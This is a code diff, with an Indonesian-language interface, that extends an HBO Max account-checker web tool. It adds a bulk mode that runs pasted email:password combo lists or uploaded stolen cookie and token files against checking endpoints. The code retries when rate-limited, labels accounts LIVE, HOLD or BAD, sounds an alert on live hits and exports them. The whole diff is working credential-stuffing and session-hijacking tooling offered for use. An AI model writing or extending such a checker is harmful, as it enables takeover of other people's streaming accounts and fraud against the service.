@@ -195,6 +195,15 @@ body.crunchyroll-body {
   color: #fff !important;
   border-color: var(--primary) !important;
 }
+.hbo-bulk-mode-btn {
+  transition: all 0.2s;
+  cursor: pointer;
+}
+.hbo-bulk-mode-btn.active {
+  background: var(--primary) !important;
+  color: #fff !important;
+  border-color: var(--primary) !important;
+}
 
 .hbomax-theme .brand-icon {
   background: linear-gradient(135deg, #b01bef 0%, #6b0f91 100%) !important;
@@ -1422,8 +1431,35 @@ tbody tr:hover {
 
     <!-- Bulk HBO Max Check -->
     <div class="card" style="padding:16px;">
-      <label style="font-size:12px; font-weight:600; margin-bottom:6px; display:block; color:var(--primary);">Bulk Combo Check</label>
-      <textarea id="hbo-bulk-input" placeholder="Paste combo list (email:password per baris)..." style="height:120px;"></textarea>
+      <label style="font-size:12px; font-weight:600; margin-bottom:6px; display:block; color:var(--primary);">Bulk Check (Combo & Cookies)</label>
+
+      <!-- Bulk mode selector -->
+      <div style="display:flex; gap:6px; margin-bottom:10px;">
+        <button class="btn-secondary hbo-bulk-mode-btn active" id="hbo-bulk-mode-combo" onclick="switchHboBulkMode('combo')" style="flex:1; justify-content:center; font-size:11px; padding:6px 0;">📝 Combo List (email:pass)</button>
+        <button class="btn-secondary hbo-bulk-mode-btn" id="hbo-bulk-mode-files" onclick="switchHboBulkMode('files')" style="flex:1; justify-content:center; font-size:11px; padding:6px 0;">📁 Upload Cookie Files</button>
+      </div>
+
+      <!-- Combo text input -->
+      <div id="hbo-bulk-combo-area">
+        <textarea id="hbo-bulk-input" placeholder="Paste combo list (email:password per baris)..." style="height:120px;"></textarea>
+      </div>
+
+      <!-- File upload area -->
+      <div id="hbo-bulk-files-area" style="display:none;">
+        <div id="hbo-drop-zone" style="border:2px dashed var(--border); border-radius:var(--radius-lg); padding:28px 16px; text-align:center; cursor:pointer; transition:all 0.2s; background:var(--bg-input);" onclick="document.getElementById('hbo-file-input').click()">
+          <div style="font-size:28px; margin-bottom:8px;">📂</div>
+          <div style="font-weight:600; font-size:13px; color:var(--text-main);">Drag & drop cookie files di sini</div>
+          <div style="font-size:11px; color:var(--text-muted); margin-top:4px;">atau klik untuk browse · Netscape/JSON cookies · Multiple files = bulk check</div>
+          <div style="font-size:10px; color:var(--text-dim); margin-top:6px;">Format: .txt .json .cookie — satu file per akun</div>
+        </div>
+        <input type="file" id="hbo-file-input" multiple accept=".txt,.json,.cookie,.cookies" style="display:none;" onchange="handleHboCookieFiles(this.files)">
+        <div id="hbo-file-list" style="margin-top:10px; max-height:120px; overflow-y:auto;"></div>
+        <div style="display:flex; align-items:center; gap:8px; margin-top:8px;">
+          <span id="hbo-file-count" style="font-size:11px; font-weight:600; color:var(--text-muted);">0 file dipilih</span>
+          <button class="btn-secondary" style="padding:3px 10px; font-size:10px;" onclick="clearHboCookieFiles()">Clear All</button>
+        </div>
+      </div>
+
       <div style="display:flex; gap:8px; margin-top:8px;">
         <button id="hbo-bulk-btn" class="btn-primary" style="flex:2;" onclick="runHboBulk()">Mulai Bulk Check</button>
         <button class="btn-secondary" style="flex:1; justify-content:center;" onclick="stopHboBulk()">Stop</button>
@@ -3725,49 +3761,74 @@ async function runHboSingle() {
 }
 
 async function runHboBulk() {
-  const raw = document.getElementById('hbo-bulk-input').value.trim();
-  if (!raw) return showToast('Paste combo list dulu');
   if (hboBulkRunning) return;
-  const lines = raw.split('\n').map(l => l.trim()).filter(l => l && l.includes(':'));
-  if (!lines.length) return showToast('Tidak ada combo valid');
+
+  // Determine mode and build job list
+  let jobs = []; // each: { type: 'combo'|'token', payload: {}, label: '...' }
+
+  if (hboBulkMode === 'files') {
+    // File upload mode — each file is a cookie/token check
+    if (!hboCookieFiles.length) return showToast('Upload cookie files dulu');
+    for (const f of hboCookieFiles) {
+      jobs.push({ type: 'token', payload: { token: f.content, use_proxy: document.getElementById('hbo-proxy-toggle')?.checked ?? false }, label: f.name });
+    }
+  } else {
+    // Combo mode — email:password lines
+    const raw = document.getElementById('hbo-bulk-input').value.trim();
+    if (!raw) return showToast('Paste combo list dulu');
+    const lines = raw.split('\n').map(l => l.trim()).filter(l => l && l.includes(':'));
+    if (!lines.length) return showToast('Tidak ada combo valid');
+    for (const combo of lines) {
+      const [email, ...pwParts] = combo.split(' | ')[0].trim().split(':');
+      const password = pwParts.join(':');
+      jobs.push({ type: 'combo', payload: { email: email.trim(), password: password.trim(), use_proxy: document.getElementById('hbo-proxy-toggle')?.checked ?? false }, label: combo.split(' | ')[0].trim() });
+    }
+  }
+
   hboBulkRunning = true; hboBulkAbort = false; hboBulkResults = [];
   const outEl = document.getElementById('hbo-bulk-out');
   const statsEl = document.getElementById('hbo-bulk-stats');
   const progressEl = document.getElementById('hbo-bulk-progress');
   const barEl = document.getElementById('hbo-progress-bar');
-  const useProxy = document.getElementById('hbo-proxy-toggle')?.checked ?? false;
   outEl.innerHTML = ''; progressEl.style.display = 'block'; barEl.style.width = '0%';
   let done = 0, live = 0, hold = 0, bad = 0, errors = 0;
-  const total = lines.length;
+  const total = jobs.length;
 
-  for (const combo of lines) {
+  for (const job of jobs) {
     if (hboBulkAbort) break;
-    const [email, ...pwParts] = combo.split(' | ')[0].trim().split(':');
-    const password = pwParts.join(':');
+
+    const endpoint = job.type === 'token' ? '/api/hbomax/token' : '/api/hbomax/check';
     let retries = 0, success = false;
+
     while (retries < 3 && !success) {
       try {
-        const res = await fetch('/api/hbomax/check', {
+        const res = await fetch(endpoint, {
           method: 'POST',
           headers: getAuthHeaders({ 'Content-Type': 'application/json' }),
-          body: JSON.stringify({ email: email.trim(), password: password.trim(), use_proxy: useProxy })
+          body: JSON.stringify(job.payload)
         });
         if (res.status === 401) { outEl.innerHTML += `<div style="padding:10px; color:#f43f5e; font-weight:600;">🔒 PIN tidak valid</div>`; hboBulkAbort = true; break; }
         if (res.status === 429) { retries++; await new Promise(r => setTimeout(r, 3000 * retries)); continue; }
-        const data = await res.json(); data.combo = combo; hboBulkResults.push(data);
+        const data = await res.json();
+        data.combo = job.label;
+        hboBulkResults.push(data);
         success = true;
         if (data.status === 'LIVE') live++;
         else if (data.status === 'HOLD') hold++;
         else if (data.status === 'BAD' || data.status === 'DEAD') bad++;
         else errors++;
-        outEl.innerHTML += renderHboResult({ ...data, email: email.trim(), _password: password.trim(), combo: combo.split(' | ')[0].trim() }, 'bulk');
+
+        const renderData = job.type === 'token'
+          ? { ...data, mode: 'token', combo: job.label }
+          : { ...data, email: job.payload.email, _password: job.payload.password, combo: job.label };
+        outEl.innerHTML += renderHboResult(renderData, 'bulk');
         outEl.scrollTop = outEl.scrollHeight;
         updateHboStats(data.status);
         if (data.status === 'LIVE') playAlert('live');
         else if (data.status === 'HOLD') playAlert('hold');
       } catch(e) {
         retries++;
-        if (retries >= 3) { errors++; outEl.innerHTML += `<div style="padding:6px; font-size:11px; color:#f59e0b;">⚠️ ${email}: ${e.message}</div>`; success = true; }
+        if (retries >= 3) { errors++; outEl.innerHTML += `<div style="padding:6px; font-size:11px; color:#f59e0b;">⚠️ ${job.label}: ${e.message}</div>`; success = true; }
         else { await new Promise(r => setTimeout(r, 2000)); }
       }
     }
@@ -3782,6 +3843,106 @@ async function runHboBulk() {
 }
 
 function stopHboBulk() { hboBulkAbort = true; }
+
+// Bulk mode switcher (combo vs file upload)
+let hboBulkMode = 'combo';
+let hboCookieFiles = []; // {name, content}
+
+function switchHboBulkMode(mode) {
+  hboBulkMode = mode;
+  const comboArea = document.getElementById('hbo-bulk-combo-area');
+  const filesArea = document.getElementById('hbo-bulk-files-area');
+  const comboBtn = document.getElementById('hbo-bulk-mode-combo');
+  const filesBtn = document.getElementById('hbo-bulk-mode-files');
+
+  if (mode === 'files') {
+    comboArea.style.display = 'none';
+    filesArea.style.display = 'block';
+    comboBtn.classList.remove('active');
+    filesBtn.classList.add('active');
+    filesBtn.style.background = 'var(--primary)';
+    filesBtn.style.color = '#fff';
+    filesBtn.style.borderColor = 'var(--primary)';
+    comboBtn.style.background = '';
+    comboBtn.style.color = '';
+    comboBtn.style.borderColor = '';
+  } else {
+    comboArea.style.display = 'block';
+    filesArea.style.display = 'none';
+    filesBtn.classList.remove('active');
+    comboBtn.classList.add('active');
+    comboBtn.style.background = 'var(--primary)';
+    comboBtn.style.color = '#fff';
+    comboBtn.style.borderColor = 'var(--primary)';
+    filesBtn.style.background = '';
+    filesBtn.style.color = '';
+    filesBtn.style.borderColor = '';
+  }
+}
+
+function handleHboCookieFiles(fileList) {
+  for (const file of fileList) {
+    const reader = new FileReader();
+    reader.onload = (e) => {
+      hboCookieFiles.push({ name: file.name, content: e.target.result, size: file.size });
+      renderHboFileList();
+    };
+    reader.readAsText(file);
+  }
+}
+
+function renderHboFileList() {
+  const list = document.getElementById('hbo-file-list');
+  const count = document.getElementById('hbo-file-count');
+  count.textContent = `${hboCookieFiles.length} file dipilih`;
+  list.innerHTML = hboCookieFiles.map((f, i) => {
+    const sizeStr = f.size > 1024 ? `${(f.size/1024).toFixed(1)} KB` : `${f.size} B`;
+    const isNetscape = f.content.includes('\t') && (f.content.includes('.hbomax.com') || f.content.includes('hbomax.com') || f.content.includes('.max.com'));
+    const isJwt = f.content.trim().startsWith('eyJ') && f.content.trim().split('.').length === 3;
+    const fmt = isNetscape ? '🍪 Netscape' : isJwt ? '🔑 JWT' : '📄 Token';
+    return `<div style="display:flex; align-items:center; gap:8px; padding:4px 8px; background:var(--bg-subtle); border-radius:var(--radius-sm); margin-bottom:4px; font-size:11px;">
+      <span style="color:var(--primary); font-weight:600;">${fmt}</span>
+      <span style="flex:1; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;" title="${f.name}">${f.name}</span>
+      <span style="color:var(--text-dim);">${sizeStr}</span>
+      <button onclick="removeHboCookieFile(${i})" style="background:none; border:none; color:var(--dead); cursor:pointer; font-size:14px; padding:0 2px;">✕</button>
+    </div>`;
+  }).join('');
+}
+
+function removeHboCookieFile(idx) {
+  hboCookieFiles.splice(idx, 1);
+  renderHboFileList();
+}
+
+function clearHboCookieFiles() {
+  hboCookieFiles = [];
+  document.getElementById('hbo-file-input').value = '';
+  renderHboFileList();
+}
+
+// Drag & drop support
+document.addEventListener('DOMContentLoaded', () => {
+  const dropZone = document.getElementById('hbo-drop-zone');
+  if (!dropZone) return;
+  ['dragenter', 'dragover'].forEach(evt => {
+    dropZone.addEventListener(evt, (e) => {
+      e.preventDefault(); e.stopPropagation();
+      dropZone.style.borderColor = 'var(--primary)';
+      dropZone.style.background = 'rgba(176, 27, 239, 0.08)';
+    });
+  });
+  ['dragleave', 'drop'].forEach(evt => {
+    dropZone.addEventListener(evt, (e) => {
+      e.preventDefault(); e.stopPropagation();
+      dropZone.style.borderColor = 'var(--border)';
+      dropZone.style.background = 'var(--bg-input)';
+    });
+  });
+  dropZone.addEventListener('drop', (e) => {
+    const files = e.dataTransfer.files;
+    if (files.length) handleHboCookieFiles(files);
+  });
+});
 
 function exportHboHits() {
   const hits = hboBulkResults.filter(r => r.status === 'LIVE');
